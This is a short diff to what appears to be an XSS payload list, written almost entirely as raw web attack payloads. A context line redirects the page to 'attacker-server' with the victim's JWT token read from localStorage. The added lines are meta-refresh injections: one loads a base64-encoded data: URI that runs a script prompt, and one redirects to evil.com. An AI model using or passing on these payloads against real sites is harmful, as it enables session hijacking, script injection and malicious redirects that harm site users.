@@ -48,3 +48,9 @@ document.location="https://attacker-server?victim_jwt_token"+document.localStora
 <svg width="200" height="200"
 xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <image xlink:href="https://example.com/image.jpg" height="200" width="200"/> </svg>
 
+
+<meta name="language" content="0;data:text/html;base64,PHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgQnkgUHJpYWwiKTwvc2NyaXB0Pg=="HTTP-EQUIV="refresh"" />
+<meta name="language" content="0;http://evil.com"HTTP-EQUIV="refresh"" />
+
+
+
